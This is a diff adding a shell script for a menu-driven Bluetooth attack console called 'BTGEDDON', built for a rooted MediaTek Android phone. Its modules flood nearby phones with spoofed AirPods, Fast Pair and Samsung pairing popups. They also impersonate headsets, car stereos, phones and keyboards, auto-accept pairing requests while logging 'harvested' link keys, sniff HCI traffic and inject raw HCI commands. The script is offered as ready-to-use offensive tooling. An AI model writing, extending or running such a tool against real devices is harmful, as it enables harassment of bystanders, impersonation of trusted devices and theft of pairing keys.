@@ -1,0 +1,399 @@
+#!/bin/sh
+# ==============================================================================
+# BTGEDDON: Next-Gen Native Mobile Bluetooth Auditing & Exploitation Suite
+# Tailored for Realme Narzo 30A (MediaTek MT6768 / MT6631) & Android Root
+# Pure-Linux Hardware Baseband Integration via /dev/stpbt
+# ==============================================================================
+
+export PATH="/data/adb/modules/mtk-aircrack-core/system/bin:/system/xbin:/data/data/com.termux/files/usr/bin:/system_ext/bin:/system/bin:/vendor/bin:$PATH"
+export LD_LIBRARY_PATH="/data/data/com.termux/files/usr/lib:$LD_LIBRARY_PATH"
+export TERM="${TERM:-xterm-256color}"
+
+# Colors
+C_RED="\033[1;31m"
+C_GRN="\033[1;32m"
+C_YLW="\033[1;33m"
+C_BLU="\033[1;34m"
+C_MAG="\033[1;35m"
+C_CYN="\033[1;36m"
+C_WHT="\033[1;37m"
+C_DIM="\033[2m"
+C_RST="\033[0m"
+
+BT_DEV="/dev/stpbt"
+OUTPUT_DIR="/sdcard/btgeddon"
+mkdir -p "$OUTPUT_DIR" 2>/dev/null || OUTPUT_DIR="/data/local/tmp/btgeddon"
+mkdir -p "$OUTPUT_DIR" 2>/dev/null
+
+CURRENT_PROFILE="None (Idle)"
+CURRENT_COD="0x000000"
+ACTIVE_NAME="Default"
+ANDC_MODE="ON"
+BG_PID=""
+
+check_root() {
+    if [ "$(id -u)" != "0" ]; then
+        echo -e "${C_RED}[-] Error: btgeddon must be run as root (su).${C_RST}" >&2
+        exit 1
+    fi
+}
+
+check_baseband() {
+    if [ ! -c "$BT_DEV" ]; then
+        echo -e "${C_RED}[-] MediaTek Bluetooth Baseband device ($BT_DEV) not found!${C_RST}" >&2
+        echo -e "${C_YLW}[*] Ensure wmt_drv and bt_drv modules are loaded.${C_RST}" >&2
+        return 1
+    fi
+    return 0
+}
+
+stop_background_process() {
+    if [ -n "$BG_PID" ] && kill -0 "$BG_PID" 2>/dev/null; then
+        kill -TERM "$BG_PID" 2>/dev/null
+        sleep 0.5
+        kill -9 "$BG_PID" 2>/dev/null
+        BG_PID=""
+    fi
+    killall -9 bt-agent bt-inject btmon-mtk 2>/dev/null
+}
+
+cleanup() {
+    trap - INT TERM EXIT
+    stop_background_process
+    echo -e "\n${C_CYN}[*] Radio powered down cleanly. Goodbye!${C_RST}"
+    exit 0
+}
+
+trap cleanup INT TERM EXIT
+
+print_header() {
+    clear
+    echo -e "${C_MAG}==============================================================${C_RST}"
+    echo -e "${C_WHT}            BTGEDDON  ${C_MAG}[MediaTek MT6768 / MT6631]${C_RST}"
+    echo -e "${C_DIM}     Hardware Bluetooth 5.0 Auditing & Spoofing Console${C_RST}"
+    echo -e "${C_MAG}==============================================================${C_RST}"
+
+    local dev_stat="${C_GRN}ONLINE (/dev/stpbt)${C_RST}"
+    [ ! -c "$BT_DEV" ] && dev_stat="${C_RED}OFFLINE${C_RST}"
+
+    echo -e " ${C_CYN}[●] Baseband:${C_RST} $dev_stat | ${C_CYN}Android Mode (--andc):${C_RST} ${C_YLW}$ANDC_MODE${C_RST}"
+    echo -e " ${C_CYN}[●] Identity:${C_RST} ${C_WHT}$CURRENT_PROFILE${C_RST} (${C_YLW}$CURRENT_COD${C_RST})"
+    echo -e "${C_MAG}--------------------------------------------------------------${C_RST}"
+}
+
+pause() {
+    echo ""
+    echo -e -n "${C_DIM}Press [Enter] to return...${C_RST}"
+    read -r _
+}
+
+# ==============================================================================
+# MODULE 1: BLE PROXIMITY BEACON & NOTIFICATION FLOODER
+# ==============================================================================
+menu_ble_flood() {
+    while true; do
+        print_header
+        echo -e "  ${C_WHT}[ MODULE 1: BLE PROXIMITY & POPUP INJECTION ]${C_RST}\n"
+        echo -e "   ${C_CYN}[1]${C_RST}  Apple AirPods Pro Pairing Prompt (iOS Cards)"
+        echo -e "   ${C_CYN}[2]${C_RST}  Google Fast Pair Announcement (Pixel Buds)"
+        echo -e "   ${C_CYN}[3]${C_RST}  Samsung Galaxy Buds Notification"
+        echo -e "   ${C_CYN}[4]${C_RST}  Standard Apple iBeacon Frame"
+        echo -e "   ${C_CYN}[5]${C_RST}  Multi-Vector Continuous Spam Flood (--spam)"
+        echo -e "   ${C_CYN}[6]${C_RST}  Custom Device Name Beacon (--name)"
+        echo -e "   ${C_CYN}[7]${C_RST}  Toggle Android Compatibility (--andc) [Current: $ANDC_MODE]\n"
+        echo -e "   ${C_CYN}[0]${C_RST}  Return to Main Menu\n"
+        echo -e -n "${C_YLW}Select option [0-7]: ${C_RST}"
+        read -r choice
+
+        stop_background_process
+
+        local andc_flag=""
+        [ "$ANDC_MODE" = "ON" ] && andc_flag="--andc"
+
+        case "$choice" in
+            1)
+                echo -e "\n${C_CYN}[*] How many seconds to broadcast (0 = infinite)?${C_RST}"
+                read -r dur; [ -z "$dur" ] && dur=15
+                echo ""
+                bt-inject --airpods $andc_flag -d "$dur"
+                pause
+                ;;
+            2)
+                echo -e "\n${C_CYN}[*] How many seconds to broadcast (0 = infinite)?${C_RST}"
+                read -r dur; [ -z "$dur" ] && dur=15
+                echo ""
+                bt-inject --fastpair $andc_flag -d "$dur"
+                pause
+                ;;
+            3)
+                echo -e "\n${C_CYN}[*] How many seconds to broadcast (0 = infinite)?${C_RST}"
+                read -r dur; [ -z "$dur" ] && dur=15
+                echo ""
+                bt-inject --samsung $andc_flag -d "$dur"
+                pause
+                ;;
+            4)
+                echo -e "\n${C_CYN}[*] How many seconds to broadcast (0 = infinite)?${C_RST}"
+                read -r dur; [ -z "$dur" ] && dur=15
+                echo ""
+                bt-inject --ibeacon $andc_flag -d "$dur"
+                pause
+                ;;
+            5)
+                echo -e "\n${C_CYN}[*] Burst Interval in ms [default: 50]:${C_RST}"
+                read -r interval; [ -z "$interval" ] && interval=50
+                echo -e "${C_CYN}[*] Duration in seconds [0 = infinite / until Ctrl+C]:${C_RST}"
+                read -r dur; [ -z "$dur" ] && dur=0
+                echo ""
+                bt-inject --spam $andc_flag -i "$interval" -d "$dur"
+                pause
+                ;;
+            6)
+                echo -e "\n${C_CYN}[*] Enter Custom Device Name to broadcast:${C_RST}"
+                read -r cname
+                if [ -n "$cname" ]; then
+                    echo -e "${C_CYN}[*] How many seconds to broadcast (0 = infinite)?${C_RST}"
+                    read -r dur; [ -z "$dur" ] && dur=20
+                    echo ""
+                    bt-inject --name "$cname" -d "$dur"
+                fi
+                pause
+                ;;
+            7)
+                if [ "$ANDC_MODE" = "ON" ]; then
+                    ANDC_MODE="OFF"
+                else
+                    ANDC_MODE="ON"
+                fi
+                ;;
+            0)
+                break
+                ;;
+            *)
+                ;;
+        esac
+    done
+}
+
+# ==============================================================================
+# MODULE 2: CLASSIC BLUETOOTH IDENTITY & PROFILE FAKER
+# ==============================================================================
+menu_profile_faker() {
+    while true; do
+        print_header
+        echo -e "  ${C_WHT}[ MODULE 2: DEVICE IDENTITY & PROFILE FAKER ]${C_RST}\n"
+        echo -e "   ${C_CYN}[1]${C_RST}  Wireless Audio Headset (CoD: 0x240404 - Media Audio & Calls)"
+        echo -e "   ${C_CYN}[2]${C_RST}  Car Infotainment Stereo (CoD: 0x200408 - Contacts & Car Audio)"
+        echo -e "   ${C_CYN}[3]${C_RST}  Smartphone Identity (CoD: 0x5A020C - Phonebook / PBAP Sync)"
+        echo -e "   ${C_CYN}[4]${C_RST}  Internet Tethering Gateway (CoD: 0x020100 - PAN NAP)"
+        echo -e "   ${C_CYN}[5]${C_RST}  Wireless Bluetooth Keyboard (CoD: 0x002540 - HID)"
+        echo -e "   ${C_CYN}[6]${C_RST}  Custom Profile Builder (Set Custom Name & CoD Hex)\n"
+        echo -e "   ${C_CYN}[0]${C_RST}  Return to Main Menu\n"
+        echo -e -n "${C_YLW}Select option [0-6]: ${C_RST}"
+        read -r choice
+
+        stop_background_process
+
+        case "$choice" in
+            1)
+                CURRENT_PROFILE="BT Headset Pro"
+                CURRENT_COD="0x240404"
+                echo ""
+                bt-agent --audio
+                pause
+                ;;
+            2)
+                CURRENT_PROFILE="My Car Stereo"
+                CURRENT_COD="0x200408"
+                echo ""
+                bt-agent --carkit
+                pause
+                ;;
+            3)
+                CURRENT_PROFILE="Galaxy S22"
+                CURRENT_COD="0x5A020C"
+                echo ""
+                bt-agent --phone
+                pause
+                ;;
+            4)
+                CURRENT_PROFILE="Internet Gateway"
+                CURRENT_COD="0x020100"
+                echo ""
+                bt-agent --pan
+                pause
+                ;;
+            5)
+                CURRENT_PROFILE="Magic Keyboard"
+                CURRENT_COD="0x002540"
+                echo ""
+                bt-agent --keyboard
+                pause
+                ;;
+            6)
+                echo -e "\n${C_CYN}[*] Enter Custom Bluetooth Device Name:${C_RST}"
+                read -r cname; [ -z "$cname" ] && cname="Custom BT"
+                echo -e "${C_CYN}[*] Enter Class of Device in Hex [e.g. 240404]:${C_RST}"
+                read -r c_cod; [ -z "$c_cod" ] && c_cod="240404"
+                CURRENT_PROFILE="$cname"
+                CURRENT_COD="0x$c_cod"
+                echo ""
+                bt-agent --name "$cname" --cod "$c_cod"
+                pause
+                ;;
+            0)
+                break
+                ;;
+            *)
+                ;;
+        esac
+    done
+}
+
+# ==============================================================================
+# MODULE 3: AUTO-PAIRING & LINK KEY HARVESTER
+# ==============================================================================
+menu_pairing_harvester() {
+    print_header
+    echo -e "  ${C_WHT}[ MODULE 3: AUTO-PAIRING & LINK KEY HARVESTER ]${C_RST}\n"
+    echo -e "   ${C_CYN}[*]${C_RST} This module activates the baseband auto-pairing engine."
+    echo -e "   ${C_CYN}[*]${C_RST} Any incoming pairing request (PIN or SSP Just-Works) is"
+    echo -e "       automatically accepted and logged in real-time."
+    echo -e "   ${C_CYN}[*]${C_RST} Harvested link keys are saved to: ${C_YLW}$OUTPUT_DIR/harvested_keys.txt${C_RST}\n"
+    
+    echo -e "   Choose identity for auto-pairing:"
+    echo -e "   ${C_CYN}[1]${C_RST} Audio Headset ('BT Headset Pro')"
+    echo -e "   ${C_CYN}[2]${C_RST} Car Stereo ('My Car Audio')"
+    echo -e "   ${C_CYN}[3]${C_RST} Smartphone ('Android Device')"
+    echo -e "   ${C_CYN}[0]${C_RST} Cancel & Return\n"
+    echo -e -n "${C_YLW}Select option [0-3]: ${C_RST}"
+    read -r p_choice
+
+    local p_flag="--audio"
+    case "$p_choice" in
+        1) p_flag="--audio" ;;
+        2) p_flag="--carkit" ;;
+        3) p_flag="--phone" ;;
+        0) return ;;
+        *) p_flag="--audio" ;;
+    esac
+
+    stop_background_process
+    echo -e "\n${C_GRN}[+] Launching Auto-Pairing Interceptor...${C_RST}\n"
+    
+    # Run and log output
+    bt-agent $p_flag | tee -a "$OUTPUT_DIR/harvested_keys.txt"
+    pause
+}
+
+# ==============================================================================
+# MODULE 4: LIVE BASEBAND SNIFFER & PCAP CAPTURE
+# ==============================================================================
+menu_sniffer() {
+    print_header
+    echo -e "  ${C_WHT}[ MODULE 4: LIVE BASEBAND HCI SNIFFER & PCAP ]${C_RST}\n"
+    local pcap_name="bt_sniff_$(date +%Y%m%d_%H%M%S).pcap"
+    local pcap_path="$OUTPUT_DIR/$pcap_name"
+
+    echo -e "   ${C_CYN}[1]${C_RST} Live Terminal Decoded Sniffing"
+    echo -e "   ${C_CYN}[2]${C_RST} Capture to Wireshark PCAP File (HCI_H4 DLT=201)"
+    echo -e "   ${C_CYN}[0]${C_RST} Return\n"
+    echo -e -n "${C_YLW}Select option [0-2]: ${C_RST}"
+    read -r s_choice
+
+    stop_background_process
+
+    case "$s_choice" in
+        1)
+            echo -e "\n${C_CYN}[*] Starting live baseband decoder (Ctrl+C to stop)...${C_RST}\n"
+            btmon-mtk
+            pause
+            ;;
+        2)
+            echo -e "\n${C_GRN}[+] Writing Wireshark PCAP to: ${C_WHT}$pcap_path${C_RST}"
+            echo -e "${C_CYN}[*] Sniffing live baseband traffic (Press Ctrl+C to save and finish)...${C_RST}\n"
+            btmon-mtk -w "$pcap_path"
+            echo -e "\n${C_GRN}[✓] Saved PCAP successfully! (${C_WHT}$pcap_path${C_GRN})${C_RST}"
+            pause
+            ;;
+        *)
+            return
+            ;;
+    esac
+}
+
+# ==============================================================================
+# MODULE 5: RAW BASEBAND HCI INJECTOR
+# ==============================================================================
+menu_raw_hci() {
+    print_header
+    echo -e "  ${C_WHT}[ MODULE 5: RAW BASEBAND HCI INJECTOR ]${C_RST}\n"
+    echo -e "   Send arbitrary raw hex command frames directly to MT6631 hardware."
+    echo -e "   Format: Hex byte string (e.g. 01030c00 for HCI_Reset)\n"
+    echo -e "   Examples:"
+    echo -e "     ${C_CYN}01030C00${C_RST}                       HCI Reset"
+    echo -e "     ${C_CYN}01011000${C_RST}                       Read Local Version Information"
+    echo -e "     ${C_CYN}01091000${C_RST}                       Read BD_ADDR"
+    echo -e "     ${C_CYN}010520061122334455C6${C_RST}           Set Random BLE MAC Address\n"
+    echo -e -n "${C_YLW}Enter Hex Command (or 0 to cancel): ${C_RST}"
+    read -r hex_cmd
+
+    [ -z "$hex_cmd" ] || [ "$hex_cmd" = "0" ] && return
+
+    stop_background_process
+    echo ""
+    bt-inject --custom "$hex_cmd"
+    pause
+}
+
+# ==============================================================================
+# MODULE 6: RADIO RESET & DIAGNOSTICS
+# ==============================================================================
+menu_diagnostics() {
+    print_header
+    echo -e "  ${C_WHT}[ MODULE 6: RADIO DIAGNOSTICS & RESET ]${C_RST}\n"
+    stop_background_process
+    echo -e "   ${C_CYN}[*]${C_RST} Querying MT6631 Baseband Hardware Information..."
+    
+    # Query BD_ADDR
+    echo -e -n "   ${C_WHT}Hardware BD_ADDR:   ${C_RST}"
+    bt-inject --custom "01091000" | grep "Controller Ack" || echo "Unknown"
+
+    # Query Local Version Information
+    echo -e -n "   ${C_WHT}HCI/LMP Version:    ${C_RST}"
+    bt-inject --custom "01011000" | grep "Controller Ack" || echo "Unknown"
+
+    echo -e "\n   ${C_GRN}[✓] Baseband responds normally to raw HCI transactions.${C_RST}"
+    pause
+}
+
+# ==============================================================================
+# MAIN TUI LOOP
+# ==============================================================================
+check_root
+check_baseband || exit 1
+
+while true; do
+    print_header
+    echo -e "  ${C_WHT}OFFENSIVE & AUDITING MODULES:${C_RST}\n"
+    echo -e "   ${C_MAG}[1]${C_RST}  BLE Proximity Beacon & Popup Flooder  ${C_DIM}(AirPods/FastPair/Spam)${C_RST}"
+    echo -e "   ${C_MAG}[2]${C_RST}  Classic Bluetooth Profile & CoD Faker ${C_DIM}(Headset/CarKit/Phone/PAN)${C_RST}"
+    echo -e "   ${C_MAG}[3]${C_RST}  Auto-Pairing Engine & Key Harvester   ${C_DIM}(Just-Works SSP Auto-Accept)${C_RST}"
+    echo -e "   ${C_MAG}[4]${C_RST}  Live Baseband Sniffer & Wireshark PCAP${C_DIM}(HCI H4 Dump Link=201)${C_RST}"
+    echo -e "   ${C_MAG}[5]${C_RST}  Raw Baseband HCI Command Injector     ${C_DIM}(Hex Command Console)${C_RST}"
+    echo -e "   ${C_MAG}[6]${C_RST}  Radio Diagnostics & Hardware Query    ${C_DIM}(BD_ADDR & Version Query)${C_RST}\n"
+    echo -e "   ${C_CYN}[0]${C_RST}  Exit Console\n"
+    echo -e -n "${C_YLW}Select module [0-6]: ${C_RST}"
+    read -r main_opt
+
+    case "$main_opt" in
+        1) menu_ble_flood ;;
+        2) menu_profile_faker ;;
+        3) menu_pairing_harvester ;;
+        4) menu_sniffer ;;
+        5) menu_raw_hci ;;
+        6) menu_diagnostics ;;
+        0|x|q) cleanup ;;
+        *) ;;
+    esac
+done
